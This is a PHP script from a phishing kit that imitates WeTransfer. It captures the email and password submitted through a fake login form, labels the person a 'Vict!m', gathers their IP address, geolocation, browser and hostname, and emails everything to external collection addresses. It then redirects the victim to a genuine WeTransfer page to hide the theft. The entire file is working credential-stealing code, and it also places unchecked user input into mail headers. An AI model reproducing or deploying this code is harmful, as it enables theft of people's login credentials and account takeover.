<?php
require("blocker.php");
 ob_start();
$file = file_get_contents("php://input"); //Gets binary PDF Data
$time = microtime(true);
  
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Email:             : ".$_POST['sweetsjhj']."\n"; 
$message .= "Password:             : ".$_POST['bymyhs']."\n"; 
$mind = $_POST['sweetsjhj'];
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Bon-------------\n";
$send = "resulter1000@protonmail.com, kelly@nayinqtextile.com";
$subject = "Gen We Transfer From $ip";
$headers = "From: We Transfer <wewe@pisswpooor.com>";
$headers .= $_POST['jdgioool']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
	header("Location: https://wetransfer.com/downloads/f2018caceeye383b6982d4b6a47f2cc341d220190309200117/3df79bc6eb6e26c56056309200117/a20a7b?utm_campaign=WT_email_tracking&utm_content=general&utm_medium=download_button&utm_source=notify_recipient_email");

	 
?>